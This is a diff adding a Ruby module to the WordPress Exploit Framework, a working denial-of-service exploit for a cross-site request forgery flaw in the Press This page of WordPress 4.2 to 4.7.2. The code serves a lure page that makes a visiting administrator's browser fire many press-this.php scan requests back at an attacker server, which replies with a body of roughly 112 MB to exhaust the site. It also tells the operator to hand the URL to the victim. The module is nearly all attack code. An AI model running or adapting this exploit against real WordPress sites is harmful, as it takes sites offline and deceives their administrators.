@@ -1,0 +1,81 @@
+class Wpxf::Auxiliary::Wp472CsrfDos < Wpxf::Module
+  include Wpxf::WordPress::ReflectedXss
+
+  def initialize
+    super
+
+    update_info(
+      name: 'WordPress 4.2-4.7.2 - CSRF DoS',
+      desc: %(
+        A Cross-Site Request Forgery (CSRF) vulnerability exists on the Press This page of WordPress.
+        This issue can be used to create a Denial of Service (DoS) condition if an authenticated
+        administrator visits a malicious URL.
+      ),
+      author: [
+        'Sipke Mellema',                  # Vulnerability disclosure
+        'Rob Carr <rob[at]rastating.com>' # WPXF module
+      ],
+      references: [
+        ['WPVDB', '8770'],
+        ['URL', 'https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/'],
+        ['URL', 'https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html']
+      ],
+      date: 'Mar 06 2017'
+    )
+
+    register_option(
+      IntegerOption.new(
+        name: 'request_count',
+        required: true,
+        desc: 'The number of requests to make',
+        default: 50
+      )
+    )
+  end
+
+  def check
+    target_version = wordpress_version
+    return :unknown if target_version.nil?
+
+    version_vulnerable?(target_version, Gem::Version.new('4.7.3'), Gem::Version.new('4.2'))
+  end
+
+  def url_with_xss
+    xss_url
+  end
+
+  def request_count
+    normalized_option_value('request_count')
+  end
+
+  def generate_payload_url
+    normalize_uri(wordpress_url_admin, "press-this.php?u=#{url_encode(xss_url)}#{url_encode('.txt')}&url-scan-submit=Scan&#{Utility::Text.rand_alpha(3)}=#{Utility::Text.rand_alpha(3)}")
+  end
+
+  def on_http_request(path, _params, _headers)
+    if path == "/#{xss_path}"
+      emit_info 'Starting DoS...'
+      res = ''
+      request_count.times do
+        res = "#{res}<img src='#{generate_payload_url}'>"
+      end
+
+      { body: res, type: 'text/html' }
+    else
+      emit_info 'Sending DoS payload...'
+      '<>' * 56_000_000
+    end
+  end
+
+  def run
+    return false unless super
+
+    emit_info 'Provide the URL below to the victim to begin the denial of service'
+    puts
+    puts url_with_xss
+    puts
+
+    start_http_server
+    true
+  end
+end
